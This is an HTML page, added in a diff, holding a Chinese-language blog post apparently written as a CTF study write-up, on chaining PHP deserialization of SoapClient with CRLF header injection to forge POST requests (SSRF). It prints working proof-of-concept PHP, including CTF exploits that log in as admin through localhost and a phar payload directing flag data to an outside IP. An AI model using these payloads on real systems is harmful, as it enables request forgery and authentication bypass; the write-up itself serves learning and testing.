@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>
+    SoapClient反序列化_to_SSRF | 道萝岗特森&#39;s Blog
+  </title>
+  <meta name="description" content="hello world">
+  
+  <meta name="keywords" content="
+  技术总结
+  ">
+  
+  <meta name="author" content="daolgts">
+
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="theme-color" content="#1e2327">
+  <link rel="apple-touch-icon" href="https://github.githubassets.com/apple-touch-icon.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://github.githubassets.com/apple-touch-icon-180x180.png">
+
+  <link rel="icon" type="image/x-icon" href="/images/xixi.png">
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+  
+<script>
+  var _hmt = _hmt || [];
+  (function(){var hm = document.createElement("script");
+    hm.src = "//hm.baidu.com/hm.js?a868b3c37552464bd253d45da4b33ddf";
+    var s = document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm, s);})();
+</script>
+
+
+  <script src="//cdnjs.cloudflare.com/ajax/libs/vue/1.0.25-csp/vue.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.11.2/moment.min.js"></script>
+</head>
+
+<body id="replica-app">
+
+<nav class="navbar-wrapper">
+  <div class="navbar">
+    <div class="container clearfix">
+      <a href="/" class="navbar-logo"><i class="fa fa-github"></i></a>
+
+      <div class="navbar-search float-left desktop-only">
+        <div class="navbar-search-form">
+          <label for="gsc-i-id1">This website</label>
+          <div id="google-search">
+            <gcse:search></gcse:search>
+          </div>
+        </div>
+      </div>
+
+      <ul class="navbar-nav float-left">
+        
+        <li><a href="/archives">Archives</a></li>
+        
+        <!--  -->
+        
+        <li><a href="/tags">Tags</a></li>
+        
+        
+          <li><a href="/links">Links</a></li>
+        
+        
+          <li><a href="/about">About</a></li>
+        
+        
+      </ul>
+
+      <ul class="navbar-nav user-nav float-right desktop-only">
+        <li class="user-nav-notification">
+          <a><span class="user-nav-unread"></span><i class="fa fa-bell"></i></a>
+        </li>
+        <li>
+          <a><i class="fa fa-plus"></i> <i class="fa fa-caret-down"></i></a>
+        </li>
+        <li class="user-nav-logo">
+          <a><img src="/images/avatar.png"> <i class="fa fa-caret-down"></i></i></a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<div class="main-container">
+  <header class="header-wrapper desktop-only">
+  <div class="container header-site-detail">
+    <ul class="header-toolbar">
+      <li class="clearfix">
+        <a href="/archives" class="header-toolbar-left"><i
+                  class="fa fa-file-text"></i> Posts </a>
+        <a href="/archives"
+           class="header-toolbar-right"> 35 </a>
+      </li>
+      <li>
+        <a href="/tags" class="header-toolbar-left"><i
+                  class="fa fa-tags"></i> Tags </a>
+        <a href="/tags"
+           class="header-toolbar-right"> 15 </a>
+      </li>
+      <li>
+        <a href="/categories" class="header-toolbar-left"><i
+                  class="fa fa-folder-open"></i> Categories </a>
+        <a href="/categories"
+           class="header-toolbar-right"> 0 </a>
+      </li>
+    </ul>
+    <h2 class="header-title">
+      <i class="fa fa-book text-muted"></i>
+      <a href="/">道萝岗特森&#39;s Blog</a>
+      
+      
+    </h2>
+  </div>
+
+  <div class="container">
+    <div class="header-tab-wrapper clearfix">
+      <span class="header-tab header-tab-selected"><i class="fa fa-thumbs-o-up"></i> Like</span>
+      <span class="header-tab"><i class="fa fa-share-alt"></i> Share</span>
+      <span class="header-tab"><i class="fa fa-comments-o"></i> Discussion</span>
+      <span class="header-tab"><i class="fa fa-bookmark-o"></i> Bookmark </span>
+      <span class="header-tab"><i class="fa fa-smile-o"></i> Smile <i class="fa fa-caret-down"></i></span>
+    </div>
+  </div>
+</header>
+
+
+<div class="post-container container">
+  <h3>
+    <i class="fa fa-user-o"></i>
+    daolgts
+
+    <span class="post-date float-right" title="{{moment(1567405026000).format('MMM DD, YYYY, h:mm:ss A')}}">
+      <i class="fa fa-pencil-square-o"></i>
+      {{moment(1567405026000).fromNow()}}
+    </span>
+  </h3>
+
+  <article class="post-content">
+    <h1>SoapClient反序列化_to_SSRF</h1>
+    <p><strong>本文首发合天智汇 <a href="https://mp.weixin.qq.com/s/u_BVbN0RyV3r5YjL6WyFYw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/u_BVbN0RyV3r5YjL6WyFYw</a></strong></p>
+<p>如果在代码审计中有反序列化点，但在代码中找不到pop链，可以利用php内置类来进行反序列化</p>
+<h1 id="0x00-序列化中的魔术方法"><a href="#0x00-序列化中的魔术方法" class="headerlink" title="0x00 序列化中的魔术方法"></a>0x00 序列化中的魔术方法</h1><p><a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p>
+<blockquote>
+<p><code>__construct()， __destruct()， __call()， __callStatic()， __get()， __set()， __isset()， __unset()， __sleep()， __wakeup()， __toString()， __invoke()， __set_state()， __clone() 和 __debugInfo() 等方法在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。</code></p>
+</blockquote>
+<ul>
+<li>构造函数 <code>__construct</code> 对象被创建的时候调用</li>
+<li>析构函数 <code>__destruct</code> 对象被销毁的时候调用</li>
+<li>方法重载 <code>__call</code> 在对象中调用一个不可访问方法时调用</li>
+<li>方法重载 <code>__callStatic</code> 在静态上下文中调用一个不可访问方法时调用</li>
+<li>在给不可访问属性赋值时，<code>__set()</code> 会被调用。</li>
+<li>读取不可访问属性的值时，<code>__get()</code> 会被调用。</li>
+<li>当对不可访问属性调用 <code>isset()</code> 或 <code>empty()</code> 时，<code>__isset()</code> 会被调用</li>
+<li>当对不可访问属性调用 <code>unset()</code> 时，<code>__unset()</code> 会被调用</li>
+<li><code>__sleep()</code> 在<code>serialize()</code> 函数执行之前调用</li>
+<li><code>__wakeup()</code> 在<code>unserialize()</code> 函数执行之前调用</li>
+<li><code>__toString</code> 在一个类被当成字符串时被调用（不仅仅是echo的时候,比如file_exists()判断也会触发</li>
+</ul>
+<h1 id="0x01-php中的内置类"><a href="#0x01-php中的内置类" class="headerlink" title="0x01 php中的内置类"></a>0x01 php中的内置类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$classes = get_declared_classes();</span><br><span class="line">foreach ($classes as $class) &#123;</span><br><span class="line">   $methods = get_class_methods($class);</span><br><span class="line">   foreach ($methods as $method) &#123;</span><br><span class="line">       if (in_array($method, array(</span><br><span class="line">           &apos;__destruct&apos;,</span><br><span class="line">           &apos;__toString&apos;,</span><br><span class="line">           &apos;__wakeup&apos;,</span><br><span class="line">           &apos;__call&apos;,</span><br><span class="line">           &apos;__callStatic&apos;,</span><br><span class="line">           &apos;__get&apos;,</span><br><span class="line">           &apos;__set&apos;,</span><br><span class="line">           &apos;__isset&apos;,</span><br><span class="line">           &apos;__unset&apos;,</span><br><span class="line">           &apos;__invoke&apos;,</span><br><span class="line">           &apos;__set_state&apos;</span><br><span class="line">       ))) &#123;</span><br><span class="line">           print $class . &apos;::&apos; . $method . &quot;\n&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="0x02-SoapClient-call方法"><a href="#0x02-SoapClient-call方法" class="headerlink" title="0x02 SoapClient __call方法"></a>0x02 SoapClient <code>__call</code>方法</h1><p><code>SOAP</code> : <code>Simple Object Access Protocol</code>简单对象访问协议</p>
+<p>采用HTTP作为底层通讯协议，XML作为数据传送的格式</p>
+<p><code>__call</code>方法: <a href="https://www.php.net/manual/zh/soapclient.call.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/soapclient.call.php</a></p>
+<p>首先测试下正常情况下的<code>SoapClient</code>类，调用一个不存在的函数，会去调用<code>__call</code>方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&apos;uri&apos;=&gt;&apos;bbb&apos;, &apos;location&apos;=&gt;&apos;http://127.0.0.1:5555/path&apos;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/08/27/mIO2p8.png" alt="mIO2p8.png"><br><img src="https://s2.ax1x.com/2019/08/27/mIOR1S.png" alt="mIOR1S.png"></p>
+<h1 id="0x03-CRLF漏洞"><a href="#0x03-CRLF漏洞" class="headerlink" title="0x03 CRLF漏洞"></a>0x03 CRLF漏洞</h1><p>从上图可以看到，<code>SOAPAction</code>处可控，可以把<code>\x0d\x0a</code>注入到<code>SOAPAction</code>，POST请求的header就可以被控制</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(&apos;uri&apos;=&gt;&quot;bbb\r\n\r\nccc\r\n&quot;, &apos;location&apos;=&gt;&apos;http://127.0.0.1:5555/path&apos;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;not_exists_function();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/08/27/mIj0II.png" alt="mIj0II.png"><br><img src="https://s2.ax1x.com/2019/08/27/mIjWZj.png" alt="mIjWZj.png"></p>
+<p>但<code>Content-Type</code>在<code>SOAPAction</code>的上面，就无法控制<code>Content-Typ</code>,也就不能控制POST的数据</p>
+<p>在header里<code>User-Agent</code>在<code>Content-Type</code>前面</p>
+<p><a href="https://www.php.net/manual/zh/soapclient.soapclient.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/soapclient.soapclient.php</a> :</p>
+<blockquote>
+<p>The user_agent option specifies string to use in User-Agent header.</p>
+</blockquote>
+<p><code>user_agent</code>同样可以注入<code>CRLF</code>，控制<code>Content-Type</code>的值</p>
+<p>来自wupco的poc：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$target = &apos;http://127.0.0.1:5555/path&apos;;</span><br><span class="line">$post_string = &apos;data=something&apos;;</span><br><span class="line">$headers = array(</span><br><span class="line">    &apos;X-Forwarded-For: 127.0.0.1&apos;,</span><br><span class="line">    &apos;Cookie: PHPSESSID=my_session&apos;</span><br><span class="line">    );</span><br><span class="line">$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target,&apos;user_agent&apos;=&gt;&apos;wupco^^Content-Type: application/x-www-form-urlencoded^^&apos;.join(&apos;^^&apos;,$headers).&apos;^^Content-Length: &apos;.(string)strlen($post_string).&apos;^^^^&apos;.$post_string,&apos;uri&apos;      =&gt; &quot;aaab&quot;));</span><br><span class="line"></span><br><span class="line">$aaa = serialize($b);</span><br><span class="line">$aaa = str_replace(&apos;^^&apos;,&quot;\r\n&quot;,$aaa);</span><br><span class="line">$aaa = str_replace(&apos;&amp;&apos;,&apos;&amp;&apos;,$aaa);</span><br><span class="line">echo $aaa;</span><br><span class="line"></span><br><span class="line">$c = unserialize($aaa);</span><br><span class="line">$c-&gt;not_exists_function();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/08/27/mIzgsO.png" alt="mIzgsO.png"><br><img src="https://s2.ax1x.com/2019/08/27/mIzsRx.png" alt="mIzsRx.png"></p>
+<p>如上，使用SoapClient反序列化+CRLF<strong>可以生成任意POST请求</strong>。</p>
+<p><strong><code>Deserialization + __call + SoapClient + CRLF = SSRF</code></strong></p>
+<h1 id="0x04-CTF题目"><a href="#0x04-CTF题目" class="headerlink" title="0x04 CTF题目"></a>0x04 CTF题目</h1><p>以下只关注SSRF的利用，其他知识点不再赘述</p>
+<h2 id="n1ctf2018-easy-harder-php"><a href="#n1ctf2018-easy-harder-php" class="headerlink" title="n1ctf2018 easy_harder_php"></a>n1ctf2018 easy_harder_php</h2><p><a href="https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php" target="_blank" rel="noopener">https://github.com/Nu1LCTF/n1ctf-2018/tree/master/source/web/easy_harder_php</a></p>
+<p>拿到admin密码之后，需要从127.0.0.1登陆，用到SSRF，通过注入<figure class="highlight plain"><figcaption><span>&#123;serialize object&#125;);#```引发反序列化漏洞</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">![moSr7Q.png](https://s2.ax1x.com/2019/08/27/moSr7Q.png)</span><br><span class="line"></span><br><span class="line">反序列化后的`SoapClient`对象去调用不存在的`getcountry`方法，调用`__call`，实现SSRF</span><br><span class="line"></span><br><span class="line">控制PHPSESSID为自己的session，SSRF来进行admin登陆</span><br></pre></td></tr></table></figure></p>
+<?php
+$target = 'http://127.0.0.1/index.php?action=login';
+$post_string = 'username=admin&password=nu1ladmin&code=cf44f3147ab331af7d66943d888c86f9';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93'
+    );
+$b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
+
+$aaa = serialize($b);
+$aaa = str_replace('^^',"\r\n",$aaa);
+$aaa = str_replace('&','&',$aaa);
+echo bin2hex($aaa);
+?>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">再使用上面的PHPSESSID访问，就是admin了</span><br><span class="line"></span><br><span class="line">## SUCTF2019 upload-lab2</span><br><span class="line">https://github.com/team-su/SUCTF-2019/tree/master/Web/Upload%20Labs%202</span><br><span class="line"></span><br><span class="line">题目可以上传文件，检查文件类型</span><br><span class="line"></span><br><span class="line">在`admin.php`中</span><br></pre></td></tr></table></figure>
+
+<p>if($_SERVER[‘REMOTE_ADDR’] == ‘127.0.0.1’){<br>    if(isset($_POST[‘admin’])){</p>
+<pre><code>    $ip = $_POST[&apos;ip&apos;];     //你用来获取flag的服务器ip
+    $port = $_POST[&apos;port&apos;]; //你用来获取flag的服务器端口
+
+    $clazz = $_POST[&apos;clazz&apos;];
+    $func1 = $_POST[&apos;func1&apos;];
+    $func2 = $_POST[&apos;func2&apos;];
+    $func3 = $_POST[&apos;func3&apos;];
+    $arg1 = $_POST[&apos;arg1&apos;];
+    $arg2 = $_POST[&apos;arg2&apos;];
+    $arg2 = $_POST[&apos;arg3&apos;];
+    $admin = new Ad($ip, $port, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);
+    $admin-&gt;check();
+}</code></pre><p>}</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">需要通过本地来访问，执行`$admin-&gt;check();`</span><br><span class="line"></span><br><span class="line">在`Ad`类中</span><br></pre></td></tr></table></figure>
+
+<pre><code>function __destruct(){
+    getFlag($this-&gt;ip, $this-&gt;port);
+    //使用你自己的服务器监听一个确保可以收到消息的端口来获取flag
+}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">直接就能拿到flag</span><br><span class="line"></span><br><span class="line">在`class.php`中，`File`类的`getMIME`方法调用了`finfo_file`函数</span><br></pre></td></tr></table></figure>
+
+<pre><code>function getMIME(){
+    $finfo = finfo_open(FILEINFO_MIME_TYPE);
+    $this-&gt;type = finfo_file($finfo, $this-&gt;file_name);
+    finfo_close($finfo);
+}</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`finfo_file/finfo_buffer/mime_content_type`均通过`_php_finfo_get_type`间接调用了关键函数`php_stream_open_wrapper_ex`，导致均可以使用`phar://`触发 phar反序列化</span><br><span class="line"></span><br><span class="line">`File`类的`__wakeup`方法通过反射初始化了一个类并调用了其`check`成员方法。将类名改为`SoapClient`，调用`check`方法时就会去调用`__call`方法，实现SSRF</span><br><span class="line"></span><br><span class="line">exp:</span><br></pre></td></tr></table></figure>
+
+<p>&lt;?php<br>$phar = new Phar(‘test.phar’);<br>$phar-&gt;startBuffering();<br>$phar-&gt;addFromString(‘test.txt’,’text’);<br>$phar-&gt;setStub(‘<script language="php">__HALT_COMPILER();</script>‘);</p>
+<p>class File {<br>    public $file_name = “”;<br>    public $func = “SoapClient”;</p>
+<pre><code>function __construct(){
+    $target = &quot;http://127.0.0.1/admin.php&quot;;
+    $post_string = &apos;admin=&amp;ip=111.111.111.111&amp;port=1111&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=123456&amp;arg2=123456&amp;arg3=&apos;. &quot;\r\n&quot;;
+    $headers = [];
+    $this-&gt;file_name  = [
+        null,
+        array(&apos;location&apos; =&gt; $target,
+              &apos;user_agent&apos;=&gt; str_replace(&apos;^^&apos;, &quot;\r\n&quot;, &apos;xxxxx^^Content-Type: application/x-www-form-urlencoded^^&apos;.join(&apos;^^&apos;,$headers).&apos;Content-Length: &apos;. (string)strlen($post_string).&apos;^^^^&apos;.$post_string),
+              &apos;uri&apos;=&gt;&apos;hello&apos;)
+    ];
+}</code></pre><p>}<br>$object = new File;<br>echo urlencode(serialize($object));<br>$phar-&gt;setMetadata($object);<br>$phar-&gt;stopBuffering();<br>```</p>
+<h1 id="0x05-Referer"><a href="#0x05-Referer" class="headerlink" title="0x05 Referer"></a>0x05 Referer</h1><ul>
+<li><a href="https://www.anquanke.com/post/id/153065" target="_blank" rel="noopener">https://www.anquanke.com/post/id/153065</a></li>
+<li><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html</a></li>
+<li><a href="https://xz.aliyun.com/t/2148" target="_blank" rel="noopener">https://xz.aliyun.com/t/2148</a></li>
+</ul>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+<script>
+  (function() {
+    var cx = '005157513716557594323:jvii0oiejlb';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
+      '//cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
